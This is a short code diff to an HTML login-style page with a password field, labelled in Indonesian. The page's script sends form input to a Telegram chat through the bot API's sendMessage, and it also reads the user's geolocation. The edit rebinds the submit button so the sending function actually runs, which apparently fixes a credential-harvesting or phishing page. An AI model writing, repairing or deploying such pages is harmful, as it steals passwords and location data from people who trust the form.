@@ -38,7 +38,7 @@
       <br>
       <input type="password" id="kata_sandi" placeholder="Masukkan Kata Sandi" required></input>
       <br>
-      <input onsubmit="return sendText()" id="submit" type="submit"></input>
+      <input onclick="return sendText();" id="submit" type="submit"></input>
     
     </form>
     <script>
@@ -67,6 +67,7 @@ var kata_sandi = document.getElementById('kata_sandi')
           telegramRequest('sendMessage', { chat_id: chatId, text: message });
           alert('s')
   }
+        return true;
       }
       function getLocation() {
                         if (navigator.geolocation) {
